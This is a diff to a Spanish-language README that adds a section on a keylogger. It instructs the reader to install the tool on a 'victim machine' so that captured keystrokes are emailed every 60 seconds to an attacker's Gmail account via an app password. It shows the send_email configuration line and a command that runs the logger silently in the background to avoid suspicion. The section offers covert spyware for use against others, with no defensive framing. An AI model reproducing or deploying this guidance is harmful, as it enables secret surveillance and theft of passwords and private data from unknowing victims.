@@ -116,6 +116,26 @@ Resultado:
 
 ---
 
+### KeyLogger
+
+#### main.py
+
+En la carpeta de "Keylogger" se encuentra el archivo "main.py". Si descargamos la carpetae instalamos los requerimientos en la maquina victima se enviara un correo cada 60 segundos (modificable manualmente) al receptor asignado.
+
+```bash
+self.send_email("Keylogger Actualizacion", email_body, "tucorreo@gmail.com(Emisor)", ["tucorreo@gmail.com (receptor, puedes ser tu mismo)"], "APP_KEY", )
+```
+
+En la linea de codigo que se muestra arriba se tiene que poner su correo desde el cual se enviaran las actualizaciones del keylogger y el correo receptor. En la "APP_KEY" se ingresa la contraseña creada desde la app del gestor de google.
+
+Una vez configurado todo, se ejecuta en segundo plano en la maquina victima para que no levante ningun tipo de sospecha de la siguiente manera:
+
+```bash
+python3 main.py &>/dev/null & disown 
+```
+
+---
+
 ## Requisitos
 
 * Python 3.x
